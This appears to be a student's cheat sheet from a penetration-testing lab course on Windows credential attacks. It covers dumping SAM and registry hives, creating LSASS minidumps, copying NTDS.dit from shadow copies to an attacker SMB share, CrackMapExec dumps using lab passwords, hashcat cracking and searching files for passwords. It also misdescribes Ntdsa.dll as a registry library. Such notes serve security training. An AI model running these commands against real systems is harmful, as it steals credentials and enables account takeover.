### Windows Authentication Process Overview

![Alt text](../Password/Assets/image.png)

### Local Security Authority Subsystem Service - LSASS

| **Authentication Packages**   | **Description**   |
| --------------|-------------------|
|   Lsasrv.dll    |	The LSA Server service both enforces security policies and acts as the security package manager for the LSA. The LSA contains the Negotiate function, which selects either the NTLM or Kerberos protocol after determining which protocol is to be successful. | 
|   Msv1_0.dll  |	Authentication package for local machine logons that don't require custom authentication.   |
|   Samsrv.dll	|   The Security Accounts Manager (SAM) stores local security accounts, enforces locally stored policies, and supports APIs.    |
|    Kerberos.dll   |	Security package loaded by the LSA for Kerberos-based authentication on a machine.  |
|   Netlogon.dll    |	Network-based logon service.    |
|    Ntdsa.dll  |  This library is used to create new records and folders in the Windows registry.  |


## Attacking SAM

| **Registry Hive**   | **Description**   |
| --------------|-------------------|
|   hklm\sam    |	Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext. | 
|   hklm\system  |	Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.   |
|   hklm\security	|   Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.    |

### Dumping & Cracking SAM (Local)
```powershell
## Copy registry hive
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save

## On our local machine
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/htb-ac-1137601/Desktop/

## Move copied hive back for local cracking
move sam.save \\10.10.15.16\CompData
move security.save \\10.10.15.16\CompData
move system.save \\10.10.15.16\CompData

## Dump hive
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

## Hashcat crack hive
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

### Dumping SAM (Remotely)

```bash
## Dump LSA Secrets
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa

## Dump SAM Secrets
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

## Attacking LSASS

### Dumping LSASS

```powershell
## Find LSASS process 
tasklist /svc       # CMD
Get-Process lsass   # Powershell

## Create lsass dump file
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full

## Extract credentials 
pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```

## Attacking Active Directory (AD)

### Attack Flow (Require Privilege Escalation)
```powershell
## Check privileges
net localgroup
net user

## Create Shadow Copy of C:
vssadmin CREATE SHADOW /For=C:

## Copy NTDS.dit from VSS
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

## Transferring NTDS.dit to Attack Host
cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData
```

### Alternative Remote Attack Flow

```bash
## Use CrackMapExec to automate the above steps
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```

## Credential Hunting

### Ussing Lazagne
```powershell
start lazagne.exe all
```

### Using findstr

```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```


## Useful Repositories

https://github.com/ihebski/DefaultCreds-cheat-sheet
https://github.com/urbanadventurer/username-anarchy